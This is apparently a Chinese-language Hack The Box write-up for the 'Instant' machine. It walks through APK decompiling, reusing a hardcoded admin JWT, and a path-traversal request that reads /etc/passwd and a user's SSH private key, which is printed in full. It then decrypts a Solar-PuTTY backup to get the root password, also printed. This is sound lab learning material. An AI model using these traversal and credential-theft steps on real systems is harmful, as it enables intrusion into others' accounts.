---
title: "HTB-Instant"
date: 2024-12-20
categories: 
  - "HTB-Machine"
tags: 
  - "hackthebox"
  - "linux"
---

## Box Info

| OS | Linux |
| --- | --- |
| Difficulty | Medium |

## Nmap

```
[root@kali] /home/kali/Instant  
❯ nmap instant.htb -sSCV -Pn -T4
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-20 11:39 CST
Nmap scan report for instant.htb (10.10.11.37)
Host is up (0.097s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 31:83:eb:9f:15:f8:40:a5:04:9c:cb:3f:f6:ec:49:76 (ECDSA)
|_  256 6f:66:03:47:0e:8a:e0:03:97:67:5b:41:cf:e2:c7:c7 (ED25519)
80/tcp open  http    Apache httpd 2.4.58
|_http-title: Instant Wallet
|_http-server-header: Apache/2.4.58 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.72 seconds
```

开放端口：`22`、`80`

## Analyze APK

在网页中可以下载`APK`安装包

![](./images/image-134.png)

将其下载，我这里使用的是`kali`里面的`apktool`

```
[root@kali] /home/kali/Instant/ 
❯ apktool d instant.apk
```

在`network_security_config.xml`发现子域名

```
[root@kali] /home/kali/Instant/instant/res/xml  
❯ cat network_security_config.xml 
<?xml version="1.0" encoding="utf-8"?>
<network-security-config>
    <domain-config cleartextTrafficPermitted="true">
        <domain includeSubdomains="true">mywalletv1.instant.htb</domain>
        <domain includeSubdomains="true">swagger-ui.instant.htb</domain>
    </domain-config>
</network-security-config># 
```

添加到`/etc/hosts`

## Dirsearch

```
[root@kali] /home/kali/Instant  
❯ dirsearch -u "swagger-ui.instant.htb" -t 50                                                               ⏎
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3                                                                              
 (_||| _) (/_(_|| (_| )                                                                                       
                                                                                                              
Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 50 | Wordlist size: 11460

Output File: /home/kali/Instant/reports/_swagger-ui.instant.htb/_24-12-20_15-21-03.txt

Target: http://swagger-ui.instant.htb/

[15:21:03] Starting:                                                                                          
[15:21:18] 308 - 263B  - /apidocs  ->  http://swagger-ui.instant.htb/apidocs/
[15:21:36] 403 - 287B  - /server-status                                    
[15:21:36] 403 - 287B  - /server-status/                                   
                                                                             
Task Completed       
```

## JWT token

进入`apidocs`目录查看

![](./images/image-136.png)

可以先注册一个用户试一下

```
curl -X POST "http://swagger-ui.instant.htb/api/v1/register" -H  "accept: application/json" -H  "Content-Type: application/json" -d "{  \"email\": \"string\",  \"password\": \"hyh\",  \"pin\": \"12121\",  \"username\": \"hyh\"}"
```

![](./images/image-137.png)

![](./images/image-138.png)

```
{
  "Access-Token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6NCwicm9sZSI6Imluc3RhbnRpYW4iLCJ3YWxJZCI6IjQ5ZmU0MjlkLTcwYzMtNGU2MC1iMDcxLTc3MDZkNjQ2MmI0NSIsImV4cCI6MTczNDcxMDYwMX0.TXTuplRyzyru23WdofFve33S7FiLgfs34_P4gXgbOcU",
  "Status": 201
}

#Jwt decode
{
  "id": 4,
  "role": "instantian",
  "walId": "49fe429d-70c3-4e60-b071-7706d6462b45",
  "exp": 1734710601
}
```

可以看到当前用户是一个普通用户，而其他的功能需要`Admin`的`token`才能使用，当前思路就是去`apk`的源文件里找类似于`token`或`key`的值

似乎在这个地方存在一个测试函数👇

![](./images/image-140.png)

读取那个文件，找到了一个存在的`token`，并且用户是`admin`

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwicm9sZSI6IkFkbWluIiwid2FsSWQiOiJmMGVjYTZlNS03ODNhLTQ3MWQtOWQ4Zi0wMTYyY2JjOTAwZGIiLCJleHAiOjMzMjU5MzAzNjU2fQ.v0qyyAqDSgyoNFHU7MgRQcDA0Bw99_8AEXKGtWZ6rYA

#jwt decode
{
  "id": 1,
  "role": "Admin",
  "walId": "f0eca6e5-783a-471d-9d8f-0162cbc900db",
  "exp": 33259303656
}
```

保存token到网页中

![](./images/image-141.png)

使用`/api/v1/admin/read/log`的功能，尝试进行任意文件读取，可以看到成功读取到了`/etc/passwd`

![](./images/image-142.png)

我在网页标题下面的那个Json文件中发现了泄露的用户名：`shirohige`

![](./images/image-143.png)

因此尝试读取他的`ssh`私钥内容

```
../../../../../../../home/shirohige/.ssh/id_rsa

{
  "/home/shirohige/logs/../../../../../../../home/shirohige/.ssh/id_rsa": [
    "-----BEGIN OPENSSH PRIVATE KEY-----\n",
    "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\n",
    "-----END OPENSSH PRIVATE KEY-----\n"
  ],
  "Status": 201
}
```

格式化一下之后，把密钥的权限设置为`600`，然后使用`ssh`登录即可获取到`User`

![](./images/image-144.png)

## Privilege Escalation

发现一个数据库文件

![](./images/image-145.png)

因为没有`nc`，那么使用`scp`进行远程下载文件

```
[root@kali] /home/kali/Instant  
❯ scp -i shirohige_key shirohige@instant.htb:/home/shirohige/projects/mywallet/Instant-Api/mywallet/instance/instant.db ./  
```

得到admin的密码hash

```
pbkdf2:sha256:600000$I5bFyb0ZzD69pNX8$e9e4ea5c280e0766612295ab9bff32e5fa1de8f6cbb6586fab7ab7bc762bd978
```

![](./images/image-146.png)

不过由于这个算法比较耗时间，直接爆破应该出不来

我在`/opt`里面发现了一个备份文件

![](./images/image-147.png)

以及一个`Github`的解密脚本

\[github author="Dimont-Gattsu" project="SolarPuttyDecrypterPy"\]\[/github\]

```
[root@kali] /home/kali/Instant/SolarPuttyDecrypterPy (main) ⚡ 
❯ python decrypt2.py sessions-backup.dat /usr/share/wordlists/rockyou.txt 
```

![](./images/image-148.png)

得到密码

```
username：root
password：12**24nzC!r0c%q12
```

切换用户即可拿到root

![](./images/image-149.png)

## Summary

`User`：首先进行`APK`分析，在网络配置文件中找到子域名信息，认证机制是使用的JWT token，为了找到`JWT`的生成密钥或者是示例`token`，在`APK`的包里面全局搜索得到了`admin`的`token`。在读取日志的路由上存在目录穿越导致任意文件读取，直接读取到了泄露用户的`SSH`私钥进行登录。

`Root`：感到不同寻常的是居然不是`hashcat`爆破密码，或许是因为`PBKDF2-SHA256`的爆破难度太高了，因为我是从根目录开始查找的，最开始的时候就关注到了这个`session-backup.dat`，但是在`instant.db`文件中又存在密码`hash`的泄露，导致我到处去寻找爆破方式。最后还是回到了`Solar-Putty`的备份文件，尝试使用脚本解密得到了密码。
